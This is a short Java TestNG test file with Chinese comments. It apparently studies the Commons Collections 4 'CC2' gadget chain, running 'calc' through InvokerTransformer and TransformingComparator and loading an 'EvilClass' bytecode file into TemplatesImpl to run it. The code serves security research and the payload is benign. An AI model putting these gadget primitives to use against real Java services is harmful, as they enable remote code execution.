import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.testng.annotations.Test;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TestCC2 {

    //使用transformingComparator执行命令
    @Test
    public void test1(){
        //创建转换器
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        //创建一个transformingComparator实例，并且设置转换器为invokerTransformer
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
        //调用compare方法，触发invokerTransformer的transform方法，并传入Runtime.getRuntime()
        transformingComparator.compare(Runtime.getRuntime(), 1);

    }

    @Test
    public void test3() throws Exception {
        // 创建 TemplatesImpl 实例
        TemplatesImpl templates = new TemplatesImpl();
        //读取 EvilClass.class 文件
        byte[] evilBytes = Files.readAllBytes(Paths.get( System.getProperty("user.dir")+"/src/main/java/EvilClass.class"));

        // 反射设置字段
        setFieldValue(templates, "_name", "EvilClass");
        setFieldValue(templates, "_bytecodes", new byte[][] {evilBytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 触发类加载与实例化
        templates.newTransformer(); // 弹出计算器
//        templates.getOutputProperties();
    }



    // 反射工具方法
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

